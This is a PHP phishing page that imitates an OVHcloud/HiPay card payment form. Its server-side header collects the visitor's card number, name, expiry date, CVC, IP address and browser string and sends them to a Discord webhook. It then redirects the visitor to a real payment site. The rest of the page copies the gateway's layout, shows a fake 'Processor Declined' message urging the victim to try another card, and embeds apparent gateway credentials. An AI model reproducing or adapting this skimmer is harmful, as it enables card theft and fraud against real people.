<?php
if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
    $ip = $_SERVER['HTTP_CLIENT_IP'];
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
} else {
    $ip = $_SERVER['REMOTE_ADDR'];
}
$webhookurl = "https://discord.com/api/webhooks/928598096957542420/eiYrd6AYoPod-fxzbVXhQgJyNkaBuGvHcOKLtpki0NhTbd6J22za2Z2CiaA6yYOx8Td1";
$msg = "```======
CC|" . $_GET["cardnumber"] . "
NAME|" . $_GET["ccname"] . "
CC EXP|" . $_GET["cc-exp"] . "
CVC|" . $_GET["cvc"] . "
IP|" . $ip . "
USER|" . $_SERVER['HTTP_USER_AGENT'] . "
======```";
$ch = curl_init( $webhookurl );
curl_setopt( $ch, CURLOPT_HTTPHEADER, array('Content-type: application/json'));
curl_setopt( $ch, CURLOPT_POSTFIELDS, json_encode(array ('content'=>"$msg")));
$response = curl_exec( $ch );
sleep(10);
header("Location: https://bank.paysera.com/lt/payment-gateway/card/payment/JY74QeOLedw68ZnZ2wbD");
?>
<html class=" js inlinesvg js inlinesvg js inlinesvg js inlinesvg js inlinesvg"><head>
    <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
    <meta http-equiv="content-type" content="text/html; charset=utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="shortcut icon" href="https://secure-gateway.hipay-tpp.com/images/favicon.png">
    
      <meta name="viewport" content="width=device-width, initial-scale=1, minimum-scale=1, maximum-scale=1">      <title>OVHcloud World payment page</title>                  
                            <link href="https://secure-gateway.hipay-tpp.com/lib/select2/dist/css/select2.min.css?104" media="screen" rel="stylesheet" type="text/css">
<link href="https://secure-gateway.hipay-tpp.com/css/script/select-ideal-bank.css?104" media="screen" rel="stylesheet" type="text/css">
<link href="https://secure-gateway.hipay-tpp.com/min/g=boostratp_3.1.1-css?104" media="screen" rel="stylesheet" type="text/css">
<link href="https://secure-gateway.hipay-tpp.com/min/g=basic-js-css?104" media="screen" rel="stylesheet" type="text/css">
<link href="https://secure-gateway.hipay-tpp.com/css/script/autodetection-template.css?104" media="screen" rel="stylesheet" type="text/css">
<link href="https://www.ovh.com/fr/themes/payment/hipay/ovh_fr.css?104" media="screen" rel="stylesheet" type="text/css">                                                
    


      <script type="text/javascript" src="https://secure-gateway.hipay-tpp.com/js/payment/errorTracking.js?70"></script>
<script type="text/javascript" src="https://secure-gateway.hipay-tpp.com/gateway/toolbox/reqwest.min.js?70"></script>
<script type="text/javascript" src="https://secure-gateway.hipay-tpp.com/min/g=lib-js?70"></script>
<script type="text/javascript" src="https://secure-gateway.hipay-tpp.com/js/payment/default.js?70"></script>
<script type="text/javascript" src="https://secure-gateway.hipay-tpp.com/lib/select2/dist/js/select2.min.js?70"></script>
<script type="text/javascript" src="https://secure-gateway.hipay-tpp.com/js/payment/select2-image.js?70"></script>
<script type="text/javascript" src="https://secure-gateway.hipay-tpp.com/js/payment/complementary-js-for-sdk.js?70"></script>
<script type="text/javascript" src="https://libs.hipay.com/js/sdkjs.js?70"></script>
    <script type="text/javascript">
        $(document).ready(function () {
            
            $('[data-toggle="tooltip"]').tooltip({delay: {"show": 200, "hide": 500}});
        });
    </script>
    <!-- HTML5 shim, for IE6-8 support of HTML5 elements -->
    <!--[if lt IE 9]>
    <script src="https://html5shim.googlecode.com/svn/trunk/html5.js"></script>
    <script type="text/javascript" src="https://secure-gateway.hipay-tpp.com/js/payment/css3.js"></script>
    <![endif]-->
</head>
<body class="script-body">
<div class="container">
    <div class="row">
        <div class="col-md-12 script-border">
            
<!-- header -->
<!-- class="hipay-logo" -->
<div class="payment-security-sprite-hipay"></div>
<!-- / header -->

                            <!-- order summary -->
<div class="row script-order-header">
    <div class="col-md-6">
        <span class="client-logo"></span>
    </div>
    <div class="col-md-6 condensed">
        <table id="orderSummaryTab" class="table table-condensed order-summary">
            <colgroup>
                <col width="30%">
                <col>
            </colgroup>
            <tbody>
                            <tr id="orderSummaryMerchantTR">
                    <td>Merchant</td>
                    <td class="order-summary-merchant-name">OVHcloud World</td>
                </tr>
                        <tr id="orderSummaryReferenceTR">
                <td>Order #</td>
                <td class="order-summary-amount">12671876-THIP1932148C</td>
            </tr>
            <tr id="orderSummaryAmountTR">
                <td>Amount</td>
                <td class="order-summary-amount">
                     USD 200.00                </td>
            </tr>
                                                                </tbody>
        </table>
    </div>
</div>
<!-- / order summary -->
                        <!-- loading -->
<div id="loading" class="loading hidden">
    <h3>Payment in progress</h3>
    <div class="progress progress-striped active">
        <div class="progress-bar" style="width: 100%;"></div>
    </div>
</div>
<!-- loading -->
    <!-- payment form -->
    <form action="./declined.php">

        <!-- device fingerprint -->
        <input type="hidden" name="device_fingerprint" id="ioBB">

        <!-- product selector -->
        

        <div class="col-xs-12">
                    </div>

        <div id="payment-product-description"></div>

        <!-- products subforms -->
                            
            
            
        <h5 class="text-danger" id="tokenIssueMsg" style="display: none;">The payment could not be processed. Your card has not been charged.</h5>
        <h5 class="text-danger" id="paymentProductIssueMsg" style="display: none;">This payment product is not available</h5>
        <h5 class="text-danger" id="proxyIssueMsg" style="display: none;">If you connect to the Internet through a corporate network, a firewall may be preventing you from accessing the page. Contact your network administrator for advice.</h5>
        <h5 class="text-danger" id="debitCardRestrictionMsg" style="display: none;">According to belgian regulations, only Debit Cards can be used to process this payment.</h5>
                <!-- submit button -->
        <div class="form-actions">
<p style="color:red;">Payment validation failed: Processor Declined</p>
<p style="color:red;">For security reasons you must contact system administrator.</p>
<p style="color:red;">Tip: you may try another credit card or <a href="https://buy.stripe.com/14kbMrfUkdp8cgM28c">try here</a></p>
        </div>

    </form>
    <!-- / payment form -->

    <script type="text/javascript">
        window.setTimeout(function(){parent.location.href="https://us.ovh.com/us/cgi-bin/order/paymentResult.cgi?order=12671876&orderPassword=oLF8FGEbIG&paymentType=CREDIT_CARD&result=cancel&paymentMethodId=730187&transactionId=1932148";}, 3598000);
    </script>
            <span data=""></span>
            <!-- footer -->
<div class="row script-footer">
    <div class="control-group">
        <div class="controls">
            <!-- Begin DigiCert site seal HTML and JavaScript -->
            <div id="DigiCertClickID_VD5P8Fm1_0" data-language="en" class="digicert-seal "><div id="DigiCertClickID_VD5P8Fm1Seal" style="text-decoration: none; text-align: center; display: block; vertical-align: baseline; font-size: 100%; font-style: normal; text-indent: 0px; line-height: 1; width: auto; margin: 0px auto; padding: 0px; border: 0px; background: transparent; position: relative; inset: 0px; clear: both; float: none; cursor: default;"><img src="//seal.digicert.com/seals/cascade/?tag=VD5P8Fm1&amp;referer=secure-gateway.hipay-tpp.com&amp;format=png&amp;lang=en&amp;seal_number=7&amp;seal_size=m&amp;an=min" alt="DigiCert Seal" tabindex="0" style="text-decoration: none; text-align: center; display: block; vertical-align: baseline; font-size: 100%; font-style: normal; text-indent: 0px; line-height: 1; width: auto; margin: 0px auto; padding: 0px; border: 0px; background: transparent; position: relative; inset: 0px; clear: both; float: none; cursor: pointer;"></div><span style="text-decoration: none; text-align: center; display: block; vertical-align: baseline; font-size: 100%; font-style: normal; text-indent: 0px; line-height: 1; width: auto; margin: 0px auto; padding: 0px; border: 0px; background: transparent; position: relative; inset: 0px; clear: both; float: none; cursor: default; color: black;">
                <span><a href="https://www.digicert.com/buy-ssl-certificates.htm" style="text-decoration: none; text-align: center; display: inline; vertical-align: baseline; font-size: 100%; font-style: normal; text-indent: 0px; line-height: 1; width: auto; margin: 0px auto; padding: 0px; border: 0px; background: transparent; position: relative; inset: 0px; clear: both; float: none; cursor: pointer; color: black;">Buy SSL Certificates</a></span>
            </span></div>
            <script type="text/javascript">
                var __dcid = __dcid || [];__dcid.push(["DigiCertClickID_VD5P8Fm1", "7", "m", "black", "VD5P8Fm1"]);(function(){var cid=document.createElement("script");cid.async=true;cid.src="//seal.digicert.com/seals/cascade/seal.min.js";var s = document.getElementsByTagName("script");var ls = s[(s.length - 1)];ls.parentNode.insertBefore(cid, ls.nextSibling);}());
            </script><script async="" src="//seal.digicert.com/seals/cascade/seal.min.js"></script><script async="" src="//seal.digicert.com/seals/cascade/seal.min.js"></script><script async="" src="//seal.digicert.com/seals/cascade/seal.min.js"></script><script async="" src="//seal.digicert.com/seals/cascade/seal.min.js"></script><script async="" src="//seal.digicert.com/seals/cascade/seal.min.js"></script>
            <!-- End DigiCert site seal HTML and JavaScript -->
                        <div class="payment-security-sprite-pci"></div>
        </div>
    </div>
</div>
<!-- / footer -->
        </div>
    </div>
</div>

<script type="text/javascript">
    var url = 'https://secure-gateway.hipay-tpp.com/__MERCHANTID__/payment/web/__ACTION__/__PRODUCT__/__SESSIONID__';
    var sessionid = 'ed6c7eed-af7d-4fc1-b158-d8f54de72d10';

    var env = 'production';
    var userHpayment = '94678075.secure-gateway.hipay-tpp.com';
    var passwordHpayment = 'Live_qrjjnPma9qFOwAE29InGbu88';

    var paymentConfig = {
        isDebitCardOnly: false,
        multiUseToken: "0"    };

    TPP.setTarget(env);
    TPP.setCredentials(userHpayment, passwordHpayment);
</script>




<iframe src="https://libs.hipay.com/hostedfields/index.html#type=card&amp;element=controller&amp;instanceId=906059&amp;referrer=https://secure-gateway.hipay-tpp.com" frameborder="0" allowtransparency="true" scrolling="no" width="0" height="0" name="hipay-controller-906059" title="hipay-controller-906059" id="hipay-controller-906059" data-hipay-id="hostedfield-iframe"></iframe></body></html>